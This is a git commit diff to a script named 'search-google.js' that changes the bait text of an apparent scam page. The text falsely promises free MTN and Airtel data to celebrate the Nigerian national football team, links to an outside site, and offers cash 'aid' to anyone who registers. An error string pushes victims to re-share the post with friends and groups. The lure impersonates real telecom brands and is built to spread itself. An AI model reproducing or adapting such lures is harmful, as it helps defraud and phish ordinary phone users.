9acb110985258ddc7fb915d9ad46c50243b9bb25
mfednewblog8 <nsikakimoh68@gmail.com>
2026-01-04 08:08:27 +0100

    Update search-google.js

--- search-google.js
+++ search-google.js
@@ -1,4 +1,4 @@
- var text1 = "*MTN AND AIRTEL 10GB FREE DATA*%0A%0A*MTN and Airtel is celebrating the super Eagle of Nigeria for qualifying for the 2026 World Cup*%0A%0A*Giving out 10GB to their customers*%0A%0A*FOR MTN*👇%0Ahttps://ghrant.org/super-eagle %0A%0A*FOR AIRTEL*👇%0Ahttps://ghrant.org/super-eagle ",
+ var text1 = "*MTN AND AIRTEL CELEBRATING THE SUPER EAGLE OF NIGERIA WITH 10GB FREE DATA*%0A%0A*Congrats to the Nigerian Super Eagle National Team Reaching the Africa Cup of Nations Quarterfinals*%0A%0A*We are giving out 10GB to our customers to celebrate the super eagle*%0A%0A*FOR MTN*👇%0Ahttps://ghrant.org/super-eagle %0A%0A*FOR AIRTEL*👇%0Ahttps://ghrant.org/super-eagle ",
     text2 = " an amount of ",
     text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
     error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
